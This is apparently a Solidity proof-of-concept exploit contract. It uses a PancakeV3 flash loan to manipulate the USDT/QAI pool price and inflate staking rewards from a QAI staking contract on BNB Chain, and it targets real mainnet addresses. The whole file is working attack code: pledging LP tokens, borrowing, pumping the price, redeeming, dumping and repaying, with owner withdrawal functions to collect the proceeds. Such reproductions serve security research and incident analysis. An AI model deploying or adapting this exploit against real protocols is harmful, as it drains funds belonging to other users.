//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

interface IQaiTeam {
    function bindParent(address parent) external;
}

interface IQaiHome {
    function pledge(uint256 pid, uint256 amountLp) external;
    function redeem(uint256 oid) external;
    function calcProfit(uint256 oid) external view returns (uint256, uint256);
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions private USDT_WBNB_POOL = IUniswapV3PoolActions(0x172fcD41E0913e95784454622d1c3724f546f849);

    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair private constant USDT_QAI_PAIR = IUniswapV2Pair(0x9B1E190421D410dAaeBcF493f43587b5070637E5);

    ERC20 private constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 private constant WBNB = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ERC20 private constant QAI = ERC20(0xFf32F673377Ae7f6Ca8DA03752B5e26239E7978d);
    ERC20 private constant QMX = ERC20(0xFdeDf0a4B16E8891F1D33a0513833510779eFee7);

    IQaiTeam private constant QAI_TEAM = IQaiTeam(0x2c5fdDA082F3400C31a3473d4dE3652F04793Bd7);
    IQaiHome private constant QAI_HOME = IQaiHome(0x8BdD52f80C55FBF73Cf21335709eb8096099bD86);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        (uint256 borrowAmount, uint256 oid) = abi.decode(data, (uint256, uint256));

        console.log("Before buy");
        console.log("USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("QAI balance =>", QAI.balanceOf(address(this)) / 1 ether);
        console.log();

        uint256 profit;

        (profit,) = QAI_HOME.calcProfit(oid);
        console.log("Before profit => ", profit / 1 ether);

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(QAI), USDT.balanceOf(address(this)), address(this)
        );

        (profit,) = QAI_HOME.calcProfit(oid);
        console.log("After profit => ", profit / 1 ether);

        console.log("After buy");
        console.log("Before donate");
        console.log("USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("QAI balance =>", QAI.balanceOf(address(this)) / 1 ether);
        console.log();

        QAI_HOME.redeem(oid);

        console.log("After redeem");
        console.log("Before sell");
        console.log("USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("QAI balance =>", QAI.balanceOf(address(this)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(QAI), address(USDT), QAI.balanceOf(address(this)), address(this)
        );

        USDT_QAI_PAIR.approve(address(UNISWAP_ROUTER), type(uint256).max);
        UNISWAP_ROUTER.removeLiquidity(
            address(USDT), address(QAI), USDT_QAI_PAIR.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(QAI), address(USDT), QAI.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("QAI balance =>", QAI.balanceOf(address(this)) / 1 ether);
        console.log();

        require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    function function1(address p) public onlyOwner {
        QAI_TEAM.bindParent(p);
    }

    function function2(uint256 a, uint256 b, uint256 c) public onlyOwner {
        uint256 usdtAmountForQai = a * 1 ether;
        uint256 wbnbAmountForQmx = b * 1 ether;
        uint256 pid = c;

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(QAI), usdtAmountForQai, address(this)
        );

        USDT.approve(address(UNISWAP_ROUTER), type(uint256).max);
        QAI.approve(address(UNISWAP_ROUTER), type(uint256).max);

        QAI.transfer(address(USDT_QAI_PAIR), QAI.balanceOf(address(this)));

        (uint256 usdtReserve, uint256 qaiReserve,) = USDT_QAI_PAIR.getReserves();
        uint256 usdtAmount = usdtReserve * (QAI.balanceOf(address(USDT_QAI_PAIR)) - qaiReserve) / qaiReserve;

        USDT.transfer(address(USDT_QAI_PAIR), usdtAmount);

        USDT_QAI_PAIR.mint(address(this));

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(WBNB), address(QMX), wbnbAmountForQmx, address(this)
        );

        USDT_QAI_PAIR.approve(address(QAI_HOME), type(uint256).max);
        QMX.approve(address(QAI_HOME), type(uint256).max);

        QAI_HOME.pledge(pid, USDT_QAI_PAIR.balanceOf(address(this)));
    }

    function function3(uint256 a, uint256 b) public onlyOwner {
        a = a * 1 ether;

        bytes memory params = abi.encode(a, b);

        USDT_WBNB_POOL.flash(address(this), a, 0, params);
    }
}
